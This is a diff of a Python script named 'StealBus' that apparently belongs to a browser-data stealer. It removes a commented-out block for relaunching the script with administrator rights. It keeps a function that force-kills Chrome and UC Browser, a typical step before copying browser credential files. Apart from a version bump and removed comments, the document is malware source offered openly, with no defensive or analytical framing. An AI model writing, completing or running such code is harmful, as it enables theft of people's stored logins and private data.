@@ -1,8 +1,5 @@
-#StealBus v1.0
+#StealBus v1.1
 #Instagram @ninjadak1ng
-#Twitter @ninjadak1ng
-
-#Modules :-
 
 import platform
 import subprocess
@@ -14,16 +11,7 @@ import win32con, win32api
 import shutil
 from shutil import copyfile
 
-#Run as Admin Code  ( Uncomment if necessary ) :-
 
-"""
-ASADMIN = 'asadmin'
-
-if sys.argv[-1] != ASADMIN:
-    script = os.path.abspath(sys.argv[0])
-    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
-    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
-"""
 def killprocess():
     os.system("Taskkill /F /IM chrome.exe")
     os.system("Taskkill /F /IM UCBrowser.exe")
